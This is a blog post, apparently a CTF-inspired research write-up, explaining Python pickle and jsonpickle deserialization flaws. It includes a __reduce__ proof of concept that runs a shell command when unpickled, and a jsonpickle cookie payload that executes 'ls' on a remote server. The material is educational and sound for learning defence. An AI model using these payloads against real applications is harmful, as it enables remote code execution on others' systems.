---
layout: single
title:  "Python Deserialization Vulnerabilities"
path: /posts/
date:   2020-05-22
tags: Deserialization python pickle
categories: research
classes: wide
author: komodino
excerpt: "This is a post containing my findings researching python deserialization attack vectors."
header:
  teaser: /assets/images/unserialize/picklerick.png
  teaser_home_page: true

---

Insecure Deserialization currently occupies place No.8 on OWASP's Top 10 Vulnerablitiy list for 2017.

To learn more about what deserialization attacks are, check out my write up on the Temple of Doom Vulnhub Box [here](https://pwnokefalos.eu/posts/)

## Introduction
---

In python the default and most popular module for serialization/deserialization is [Pickle](https://docs.python.org/3.8/library/pickle.html).

>The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. Pickling (and unpickling) is alternatively known as “serialization”, “marshalling,” 1 or “flattening”; however, to avoid confusion, the terms used here are “pickling” and “unpickling”.

Reading the docs, pickle immediately warns us that we shouldn't really trust user input.

![](/assets/images/unserialize/warnpickle.png)

Let's do some test and play around with pickle. First create an object, then serialize it and save it in the system.

```python
class User:
        user_stats = {}
        def __init__(self,name,age):
                self.user_stats["name"] = name
                self.user_stats["age"] = age

john = User("John",21)

# Write to file - Serialize
with open("user.dat","wb") as f:
        pickle.dump(john,f)

# Load the object from file - Unserialize
with open("user.dat","rb") as f:
        user = pickle.load(f)

print(user.user_stats)
```

This will print `{'name': 'John', 'age': 21}`  

Here we succesfully **serialized** and then **unserialized** the object `john`.

## Vulnerability Analysis

What can possibly go wrong with this?
Reading a bit further in the docs we stumble upon **__reduce__**

>The __reduce__() method takes no argument and shall return either a string or preferably a tuple.
When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:
1. A callable object that will be called to create the initial version of the object.
2. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument.<br>
  ...

A healthy use for **__reduce__** would be for providing hints/directives to pickle on how to properly deserialize the object, in case the default automatical way is not enough.

But reading the above citation we conclude that any object that is going to be unserialized and is an instance of a class that has a **__reduce__** method implementation, given the right definintion of **__reduce__**  can immediately execute a callable object during the unserialization phase.

Let's break this down a bit and create another example.
```python
#!/usr/bin/env python3
import pickle
from os import system

class User:

        def __reduce__(self):
                command = "ping -c 3 google.com"  # The command to execute
                
                # As stated in the above docs if __reduce__ returns a tuple the first 
                # tuple element must be a callable object, in this case system. The 
                # second tuple element must be a tuple itself containing the arguments 
                # to the callable object. Upon deserialization this basically corresponds
                # to system(command)
                                                  
                return (system, (command, ))

# Create test object

john = User()

# Write to file - Serialize

with open("user.dat","wb") as f:
        pickle.dump(john,f)

# Load the object from file - Unserialize

with open("user.dat","rb") as f:
        user = pickle.load(f)
```

Running the above script we see

![](/assets/images/unserialize/google_ping.png)

We have command execution!

## Another variation
---

The idea for researching this came to me while solving the **Symfonos4 Vulnhub Box** where you are presented with a website that will deserialize the user cookie.

The cookie looked something like this
`{"py/object": "app.User", "username": "Poseidon"}`

This doesn't really look like standard **pickle** syntax so doing a little research it turns out that it is encoded with **jsonpickle**
>jsonpickle is a Python library for serialization and deserialization of complex Python objects to and from JSON. The standard Python libraries for encoding Python into JSON, such as the stdlib’s json, simplejson, and demjson, can only handle Python primitives that have a direct JSON equivalent (e.g. dicts, lists, strings, ints, etc.). jsonpickle builds on top of these libraries and allows more complex data structures to be serialized to JSON. jsonpickle is highly configurable and extendable–allowing the user to choose the JSON backend and add additional backends.

What will happen is the app will take the **jsonpickled** cookie and deserialize it. In this case convert it from JSON to a normal python object. This library also has a **reduce** method and we can construct a payload with
`{"py/object": "__main__.Shell", "py/reduce": [{"py/function": "os.system"}, ["ls"], 0, 0, 0]}`

This will execute `ls` on the remote server.

### Conclusion
---

**Never trust user input.**

### Useful links and References
---

[BlackHat 2011 - Sour Pickles, A serialised exploitation guide in one part](https://www.youtube.com/watch?v=HsZWFMKsM08)

[jsonpickle exploitation](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)


